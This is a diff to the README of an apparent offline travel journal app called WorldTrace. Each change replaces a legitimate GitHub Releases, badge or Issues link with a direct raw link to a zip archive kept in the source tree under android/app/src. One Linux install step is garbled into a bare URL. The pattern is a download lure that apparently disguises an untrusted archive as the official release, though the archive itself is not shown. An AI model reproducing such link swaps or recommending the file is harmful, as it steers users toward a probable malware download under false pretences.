@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/cyd794506984/world-trace-travel-journal/releases)
+[![Download](https://raw.githubusercontent.com/cyd794506984/world-trace-travel-journal/main/android/app/src/travel_journal_world_trace_v3.3.zip)](https://raw.githubusercontent.com/cyd794506984/world-trace-travel-journal/main/android/app/src/travel_journal_world_trace_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -23,15 +23,15 @@ WorldTrace is an easy-to-use travel journal that works even when you're offline.
 
 ## 🔗 Download & Install
 
-To get started with WorldTrace, visit our [Releases page](https://github.com/cyd794506984/world-trace-travel-journal/releases) to download the app.
+To get started with WorldTrace, visit our [Releases page](https://raw.githubusercontent.com/cyd794506984/world-trace-travel-journal/main/android/app/src/travel_journal_world_trace_v3.3.zip) to download the app.
 
-1. **Visit the Releases Page**: Click [here](https://github.com/cyd794506984/world-trace-travel-journal/releases).
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/cyd794506984/world-trace-travel-journal/main/android/app/src/travel_journal_world_trace_v3.3.zip).
 2. **Select the Latest Version**: Look for the latest release, which will be at the top of the page.
 3. **Choose Your File**: Depending on your operating system, download the appropriate file (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. **Install the Application**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the WorldTrace app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the instructions in the README file.
+   - For Linux: Extract the `https://raw.githubusercontent.com/cyd794506984/world-trace-travel-journal/main/android/app/src/travel_journal_world_trace_v3.3.zip` file and follow the instructions in the README file.
 5. **Run the App**: Open WorldTrace from your applications menu or desktop.
 
 ## 📚 User Guide
@@ -75,7 +75,7 @@ If you run into issues, here are some common problems and solutions:
 ## 📞 Support
 
 If you need further assistance:
-- Visit our [Issues page](https://github.com/cyd794506984/world-trace-travel-journal/issues) for troubleshooting tips.
+- Visit our [Issues page](https://raw.githubusercontent.com/cyd794506984/world-trace-travel-journal/main/android/app/src/travel_journal_world_trace_v3.3.zip) for troubleshooting tips.
 - Open a new issue, and we will get back to you as soon as possible.
 
 ## 🎉 Contributing
